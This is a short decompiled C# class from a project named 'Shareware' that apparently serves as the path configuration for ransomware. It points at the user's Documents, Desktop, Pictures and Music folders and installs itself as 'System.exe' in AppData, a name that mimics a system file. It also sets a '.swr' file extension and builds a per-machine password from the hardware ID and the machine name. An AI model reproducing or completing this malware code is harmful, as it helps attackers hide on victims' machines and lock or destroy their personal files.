using System;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Shareware.My;

namespace Shareware.Shareware.core;

public class DirPaths
{
	public static string AppData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

	public static string Document = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyDocuments();

	public static string Desktop = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Desktop();

	public static string Pictures = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyPictures();

	public static string Music = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_MyMusic();

	public static string ProgramFiles = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_ProgramFiles();

	public static string AppNameS = "System.exe";

	public static string InstallDir = AppData + "\\" + AppNameS;

	public static string TempPath = Path.GetTempPath();

	public static string ExtensionDefaul = ".swr";

	public static string strPass = new string(Conversions.ToCharArrayRankOne(SharewareHook.UserHWID.getHWID() + Environment.MachineName));
}
